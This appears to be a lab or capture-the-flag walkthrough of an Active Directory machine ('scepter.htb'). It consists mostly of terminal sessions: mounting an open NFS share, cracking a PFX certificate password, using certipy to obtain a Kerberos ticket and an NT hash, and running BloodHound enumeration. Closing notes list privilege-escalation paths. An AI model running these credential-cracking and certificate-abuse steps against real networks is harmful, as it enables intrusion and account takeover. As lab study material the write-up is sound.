@@ -1,0 +1,141 @@
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# showmount -e 10.10.11.65   
+Export list for 10.10.11.65:
+/helpdesk (everyone)
+                           
+┌──(root㉿kali)-[/home/kali]
+└─# mount -t nfs 10.10.11.65:/helpdesk /mnt/helpdesk
+
+┌──(root㉿kali)-[/mnt/helpdesk]
+└─# ls     
+baker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx
+                                              
+
+┌──(root㉿kali)-[/home/kali]
+└─# pfx2john /mnt/helpdesk/lewis.pfx > hash 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2048 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+newpassword      (lewis.pfx)     
+1g 0:00:00:00 DONE (2025-11-17 23:24) 9.090g/s 46545p/s 46545c/s 46545C/s newzealand..babygrl
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad auth -pfx /mnt/helpdesk/lewis.pfx -password 'newpassword' -dc-ip 10.10.11.65
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'e.lewis@scepter.htb'
+[*]     Security Extension SID: 'S-1-5-21-74879546-916818434-740295365-2101'
+[*] Using principal: 'e.lewis@scepter.htb'
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERROR_CLIENT_NOT_TRUSTED(Reserved for PKINIT)
+[-] Use -debug to print a stacktrace
+[-] See the wiki for more information
+                                       
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-getTGT 'scepter.htb/e.lewis' -dc-ip 10.10.11.65                        
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+lets pivot to another user. we retry the password for baker.
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# openssl rsa -in /mnt/helpdesk/baker.key -out baker-decrypted.key
+Enter pass phrase for /mnt/helpdesk/baker.key:
+writing RSA key
+                                   
+
+┌──(root㉿kali)-[/home/kali]
+└─# openssl pkcs12 -export -out baker.pfx -inkey baker-decrypted.key -in /mnt/helpdesk/baker.crt
+Enter Export Password:
+Verifying - Enter Export Password:
+                                     
+
+┌──(root㉿kali)-[/home/kali]
+└─# certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.65
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'd.baker@scepter.htb'
+[*]     Security Extension SID: 'S-1-5-21-74879546-916818434-740295365-1106'
+[*] Using principal: 'd.baker@scepter.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'd.baker.ccache'
+[*] Wrote credential cache to 'd.baker.ccache'
+[*] Trying to retrieve NT hash for 'd.baker'
+[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodhound-python -u d.baker --hashes :18b5fb0d99e7a475316213c15b6f22ce -k -d 'scepter.htb' -c All --zip -dc dc01.scepter.htb -ns 10.10.11.65
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: scepter.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.scepter.htb:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: dc01.scepter.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc01.scepter.htb
+INFO: Found 11 users
+INFO: Found 57 groups
+INFO: Found 2 gpos
+INFO: Found 3 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc01.scepter.htb
+INFO: Done in 00M 06S
+INFO: Compressing output into 20251118073619_bloodhound.zip
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+d.baker can ForceChangePAssword A.Carter who is a member of IT Support
+IT Support has GenericAll over Staff Access Certificate
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
